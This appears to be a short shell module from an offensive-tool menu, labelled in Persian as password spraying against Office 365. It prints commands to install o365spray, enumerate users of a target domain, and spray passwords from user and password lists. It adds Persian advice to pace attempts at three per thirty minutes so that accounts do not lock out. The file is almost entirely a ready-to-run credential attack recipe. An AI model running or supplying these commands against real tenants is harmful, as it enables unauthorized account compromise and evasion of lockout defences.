DESC="پسورد اسپری روی آفیس۳۶۵"
REQ="o365spray"
RISK="HIGH"
NOTE="۳ تلاش، ۳۰ دقیقه استراحت، وگرنه lockout"

termux(){ echo "pip install o365spray"; }

kali(){
cat <<'EOF'
git clone https://github.com/0xZDH/o365spray
cd o365spray && pip install -r requirements.txt
python3 o365spray.py --domain target.com --enum
python3 o365spray.py --domain target.com --spray -U users.txt -P pass.txt
EOF
}
